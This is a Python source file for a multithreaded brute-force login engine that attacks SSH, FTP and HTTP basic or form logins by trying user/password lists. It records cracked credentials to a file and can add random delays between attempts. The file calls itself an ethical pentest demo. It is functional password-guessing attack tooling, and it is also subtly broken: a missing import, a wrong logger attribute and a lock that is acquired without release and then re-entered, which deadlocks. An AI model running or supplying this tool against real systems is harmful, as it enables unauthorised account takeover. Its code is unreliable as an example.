#!/usr/bin/env python3

"""
DEMI Smart Interface - High-level, intelligent brute force controller

Author: Perplexity AI (ethical pentest demo)
License: MIT
"""

import time
import logging
from queue import Queue, Empty
from threading import Thread, Event, Lock
from traceback import format_exc
from typing import List, Tuple, Optional, Dict, Any
import json
import os
import random
from datetime import datetime
from tqdm import tqdm

# Import modules - add your own as needed
from demi.modules import ssh, ftp, http_basic, http_form

MODULES = {
    "ssh": ssh.SSHModule,
    "ftp": ftp.FTPModule,
    "http-basic": http_basic.HTTPBasicModule,
    "http-form": http_form.HTTPFormModule,
}

class SmartDemiEngine:
    """Modern, adaptive, and intelligent brute force engine."""

    def __init__(
        self,
        module_class,
        target: str,
        users: Optional[List[str]] = None,
        passwords: Optional[List[str]] = None,
        pairs: Optional[List[Tuple[str, str]]] = None,
        max_threads: int = 32,
        timeout: float = 5.0,
        stop_on_success: bool = False,
        module_options: Optional[Dict[str, Any]] = None,
        random_delay: bool = False,
        min_delay: float = 0.0,
        max_delay: float = 0.5,
        log_file: Optional[str] = None,
        result_file: Optional[str] = None,
    ):
        self.module_class = module_class
        self.target = target
        self.users = users or []
        self.passwords = passwords or []
        self.pairs = pairs or []
        self.max_threads = max_threads
        self.timeout = timeout
        self.stop_on_success = stop_on_success
        self.module_options = module_options or {}
        self.random_delay = random_delay
        self.min_delay = min_delay
        self.max_delay = max_delay
        self.log_file = log_file
        self.result_file = result_file

        self.queue = Queue()
        self.results = []
        self.lock = Lock()
        self.stop_event = Event()
        self.attempts = 0
        self.errors = 0
        self.fatal_errors = 0

        self.logger = logging.getLogger("demi.smart_engine")
        if log_file:
            handler = logging.FileHandler(log_file)
            handler.setFormatter(logging.Formatter(
                '%(asctime)s [%(levelname)s] %(message)s'
            ))
            self.logger.addHandler(handler)
        self.logger.setLevel(logging.INFO)
        logging.basicConfig(
            stream=sys.stdout,
            level=logging.INFO,
            format='%(asctime)s [%(levelname)s] %(message)s'
        )

    def enqueue_tasks(self):
        """Queue credentials from pairs or user/pass combinations."""
        self.logger.info("Queuing credentials")
        if self.pairs:
            for user, password in self.pairs:
                if self.stop_event.is_set():
                    break
                self.queue.put((user, password))
        else:
            for user in self.users:
                for password in self.passwords:
                    if self.stop_event.is_set():
                        break
                    self.queue.put((user, password))
        self.logger.info(f"Queued {self.queue.qsize()} credentials")

    def worker(self):
        """Worker thread: attempts logins, handles retries, and reports."""
        module = self.module_class(timeout=self.timeout, **self.module_options)
        while not self.stop_event.is_set():
            user, password = None, None
            try:
                user, password = self.queue.get(timeout=1)
                if self.random_delay:
                    time.sleep(random.uniform(self.min_delay, self.max_delay))
                success = module.login(self.target, user, password)
                self.lock.acquire()
                self.attempts += 1
                if success:
                    self.results.append((user, password))
                    self.logger.info(f"VALID: {user}:{password}")
                    self._save_result((user, password))
                    if self.stop_on_success:
                        self.logger.info("Stop-on-success: Stopping all threads")
                        self.stop_event.set()
                        # Clear queue to halt immediately
                        with self.lock:
                            while not self.queue.empty():
                                try:
                                    self.queue.get_nowait()
                                except Empty:
                                    break
                else:
                    self.logger.debug(f"INVALID: {user}:{password}")
            except Empty:
                break
            except Exception as e:
                with self.lock:
                    self.errors += 1
                self.logger.warning(f"Error: {user}:{password}: {str(e)}")
                self.logger.debug(format_exc())
            finally:
                if user and password:
                    self.queue.task_done()

    def _save_result(self, cred: Tuple[str, str]):
        if self.result_file:
            mode = "a" if os.path.exists(self.result_file) else "w"
            with open(self.result_file, mode) as f:
                f.write(f"{cred[0]}:{cred[1]}\n")

    def run(self) -> List[Tuple[str, str]]:
        """Run the attack and return all valid credentials."""
        self.logger.info("Starting attack")
        self.enqueue_tasks()
        start_time = time.time()

        workers = []
        for _ in range(min(self.max_threads, self.queue.qsize() or 1)):
            t = Thread(target=self.worker, daemon=True)
            workers.append(t)
            t.start()

        # Progress bar (optional, requires tqdm)
        progress = None
        if not self.logger.handlers.stream.isatty():
            total = self.queue.qsize()
            if total > 0:
                progress = tqdm(total=total, desc="Progress", unit="creds", ascii=True)

        # Handle interrupt and measure progress
        try:
            while not self.queue.empty() and not self.stop_event.is_set():
                time.sleep(0.1)
                if progress:
                    progress.n = total - self.queue.qsize()
                    progress.refresh()
        except KeyboardInterrupt:
            self.logger.warning("Interrupted: Stopping threads gracefully...")
            self.stop_event.set()
        finally:
            for t in workers:
                t.join(timeout=2)
            if progress:
                progress.close()
            duration = time.time() - start_time
            self.logger.info(f"Attacked: {self.attempts} creds, {self.errors} errs, {len(self.results)} success")
            self.logger.info(f"Time: {duration:.2f}s, {self.attempts/max(duration, 0.01):.2f} creds/sec")
        return self.results
